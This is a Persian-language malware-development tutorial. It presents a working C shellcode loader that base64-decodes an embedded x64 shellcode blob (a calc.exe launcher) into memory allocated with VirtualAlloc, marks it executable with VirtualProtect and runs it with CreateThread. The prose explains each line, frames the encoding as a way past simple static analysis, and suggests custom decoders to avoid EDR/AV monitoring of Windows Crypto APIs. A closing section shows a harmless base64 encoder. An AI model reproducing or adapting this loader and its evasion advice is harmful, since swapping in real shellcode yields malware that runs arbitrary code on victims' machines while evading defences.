

```c++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Wincrypt.h>
#pragma comment (lib, "Crypt32.lib")

unsigned char calc_payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";

unsigned int calc_len = sizeof(calc_payload);

int DecodeBase64( const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen ) {

  
    DWORD outLen;
    BOOL fRet;
    outLen = dstLen;
    fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &outLen, NULL, NULL);

    if (!fRet) outLen = 0;  // failed
    return( outLen );
}
int main(void) {
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // Allocate new memory buffer for payload

    exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
    printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
    printf("\nHit me 1st!\n");
    getchar();

    DecodeBase64((const BYTE *)calc_payload, calc_len, (char *) exec_mem, calc_len);
    rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);
    printf("\nHit me 2nd!\n");
    getchar();
    if ( rv != 0 ) {
            th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
            WaitForSingleObject(th, -1);
    }
    return 0;
}
```



در دنیای توسعه بدافزار یا ابزارهای تهاجمی، ما اغلب Payload ها (مثل همین shellcode اجرای ماشین حساب که در آرایه `calc_payload` دارید) را به صورت Base64 انکود می‌کنیم. چرا؟ چون رشته‌های متنی به راحتی در سورس‌کد (بخش `.data` یا `.rdata` فایل PE) قرار می‌گیرند و گاهی از برخی تحلیل‌های استاتیک ساده عبور می‌کنند. اما پردازنده نمی‌تواند Base64 را اجرا کند؛ ما به بایت‌های خام (Raw Bytes) نیاز داریم.

به جای اینکه خودمان یک الگوریتم دیکد کردن Base64 بنویسیم (که باعث افزایش حجم کد و احتمال خطا می‌شود)، از توابع آماده و قدرتمند خود سیستم‌عامل ویندوز که در `Crypt32.dll` قرار دارند استفاده می‌کنیم.

بیایید این تابع را خط به خط کالبدشکافی کنیم:

### ۱. تعریف متغیرهای اولیه
```c
DWORD outLen;
BOOL fRet;
```
در برنامه‌نویسی Win32، ما عاشق تایپ‌های خود ویندوز هستیم. `DWORD` یک عدد صحیح ۳۲ بیتی بدون علامت است که معمولاً برای سایزها و طول‌ها استفاده می‌شود. `BOOL` هم برای دریافت نتیجه موفقیت یا شکست توابع API ویندوز است.

### ۲. آماده‌سازی پارامتر IN/OUT
```c
outLen = dstLen;
```
این یک مفهوم بسیار مهم در Windows API است. ما متغیر `outLen` را با مقدار بافر مقصد (`dstLen`) مقداردهی اولیه می‌کنیم. تابعی که در قدم بعدی صدا می‌زنیم، از این متغیر به عنوان یک پارامتر **IN/OUT** استفاده می‌کند:
*   **IN (ورودی):** به API می‌گوید: «حداکثر فضایی که در بافر مقصد داری اینقدر است، پس سرریز بافر (Buffer Overflow) نکن!»
*   **OUT (خروجی):** پس از پایان کار، API مقدار این متغیر را تغییر می‌دهد تا به ما بگوید: «من دقیقاً این تعداد بایت را پس از دیکد کردن در بافر نوشتم.»

### ۳. قلب تپنده تابع: فراخوانی CryptStringToBinary
```c
fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &outLen, NULL, NULL);
```
اینجا جایی است که جادو اتفاق می‌افتد. ما تابع `CryptStringToBinary` (که به دلیل تنظیمات کامپایلر شما احتمالاً به `CryptStringToBinaryA` برای رشته‌های ASCII مپ می‌شود) را فراخوانی می‌کنیم. بیایید پارامترها را بررسی کنیم:

1.  `(LPCSTR) src`: اشاره‌گر به رشته Base64 ما (همان Payload).
2.  `srcLen`: طول رشته ورودی.
3.  `CRYPT_STRING_BASE64`: این فلگ (Flag) بسیار مهم است. ما به Crypto API ویندوز می‌گوییم: «داده‌ای که به تو دادم از نوع Base64 است، لطفاً با این فرمت با آن رفتار کن.»
4.  `(BYTE *)dst`: اشاره‌گر به بافر خالی ما در حافظه که بایت‌های دیکد شده (Payload نهایی و قابل اجرا) در آن ریخته می‌شود.
5.  `&outLen`: آدرس متغیر طول. همانطور که گفتم، API اینجا طول واقعی بایت‌های خروجی را می‌نویسد.
6.  `NULL, NULL`: این دو پارامتر برای دریافت تعداد کاراکترهای نادیده گرفته شده و فرمت دقیق رشته هستند که ما اینجا به آن‌ها نیازی نداریم.

### ۴. مدیریت خطا (Error Handling)
```c
if (!fRet) outLen = 0;  // failed
```
هیچ برنامه‌نویس حرفه‌ای سیستم، مدیریت خطا را فراموش نمی‌کند. تابع `CryptStringToBinary` در صورت موفقیت `TRUE` و در صورت شکست (مثلاً اگر بافر مقصد کوچکتر از حد نیاز باشد یا رشته ورودی Base64 معتبری نباشد) `FALSE` برمی‌گرداند. اگر شکست خورد، ما طول خروجی را `0` در نظر می‌گیریم تا کدهای بعدی (مثلاً تابعی که قرار است با `VirtualAlloc` حافظه تخصیص دهد) بفهمند که عملیات ناموفق بوده است.

### ۵. خروجی
```c
return( outLen );
```
در نهایت، تابع تعداد بایت‌های دیکد شده را برمی‌گرداند. 

**نکته امنیتی و تهاجمی (از دید یک محقق Red Team):**
استفاده از این تابع بسیار رایج و کارآمد است، اما به یاد داشته باشید که نرم‌افزارهای EDR/AV ممکن است به فراخوانی‌های `CryptStringToBinary` در صورتی که بلافاصله پس از آن توابعی مثل `VirtualAlloc` (با دسترسی `PAGE_EXECUTE_READWRITE`) و `CreateThread` صدا زده شوند، حساسیت نشان دهند (Heuristic Analysis). در تکنیک‌های پیشرفته‌تر، ممکن است نیاز به پیاده‌سازی Custom Base64 Decoder داشته باشید تا از مانیتور شدن API های Crypto ویندوز فرار کنید.

---

اما در entry point  برنامه چیکار کردیم.
اگر به کد های قبلی توجه کنید ما اومدیم فقط یه data مثله NOP رو داخل currentprocess اجرا کردیم
که مفاهیمی از جمله درخواست کردن حافظه از سمت kernel، اجرا کردن اون payload  یاد گرفتیم و با API هایی نظیر **VirtualAlloc,VirtualProtect,memcpy** آشنا شدیم 
و اشاره کردیم که text ها در بخش .data,rdata قرار میگیرند icon ها در بخش rsrc قرار میگیره و..... 
حالا قراره که بریم باهم دیگه یه payload رو به صورت base64 در بخش .data,rdata قرار بدیم و در نهایت به صورت encode شده اجرا کنه 
درسته که این روش هم در حال حاضر جواب نمیده اما می تونه شروع خوبی برامون باشه تا با این مفاهیم بیشتر آشنا بشیم و وتو روش های بعدی الگوریتم هایی که برای encode وجود دارند رو بخونیم و encoder خودمون رو بنویسیم.

بریم این خط رو بیشتر باهم تحلیل کنیم 

```c++
// Allocate new memory buffer for payload

    exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Decode the payload back to binary form

    DecodeBase64((const BYTE *)calc_payload, calc_len, (char *) exec_mem, calc_len);
```

من از عمد printf هارو برداشتم تا مواردی که بهش نیاز داریم رو حذف کنیم تا خوانا تر باشه
ما تابع مربوط به base64 رو از قبل نوشته بودیم و صرفا تو این مرحله اومدیم اجراش کردیم اما چه پارامتر هایی رو دادیم،
متغیر calc_payload که به همون payload مون که به صورت b64 بود اشاره میکرد که ما اومدیم تبدیلش کردیم به بایت به این خاطر که قراره این payload رو  تو memory اجرا کنیم پس باید به دیتایی قابل پردازش تبدیلش کنیم که string  طبیعتا بایت نیست ولی میتونه تبدیل بشه 
پس payload مون رو به بایت cast میکنیم 
پارامتر بعدی که به تابع میدیم طول مربوط به payload مون است 
پارامتر سوم مقدار واقعی که توسط تابع CryptStringToBinary خونده میشه باید ریخته بشه داخل یه ادرسی تو  حافظه که اون مقدار میشه همون payload ما که ریخته میشه داخل ادرسی که از سمت kernel  به واسطه تابع VirtualAlloc درخواست شده و دوباره به عنوان پارامتر چهارم طول مربوط payload رو میدیم 
و به همین ترتیب اون page که payload ما اجرا شده رو با استفاده از تابع VirtualProtect  اجرا میکنیم 
اما برای اینکه اجرا بشه باید براش یه Thread  بسازیم و همینکارو هم میکنیم و ادرس مربوط به page که قراره بره اجرا کنه رو بهش میدیم در پارامتر سوم.


##### Convert String To Base64


```c++
#include <Windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "crypt32.lib")

int EncodeBase64(const BYTE* src, unsigned int srcLen, char* dst, unsigned int dstLen) {
    DWORD outLen = dstLen;
    BOOL fRet = CryptBinaryToStringA(
        src,
        srcLen,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        dst,
        &outLen
    );

    if (!fRet) {
        return 0;
    }

    return (int)outLen;
}

int main(void) {
    unsigned char payload[] = "hello charon";
    unsigned int paylen = (unsigned int)strlen((char*)payload);

    int needed = EncodeBase64((const BYTE*)payload, paylen, NULL, 0);
    printf("needed len: %d\n", needed);

    char out[256];
    int written = EncodeBase64((const BYTE*)payload, paylen, out, sizeof(out));
    if (written > 0) {
        printf("Base64Encode: %s\n", out);
    }

    return 0;
}

```


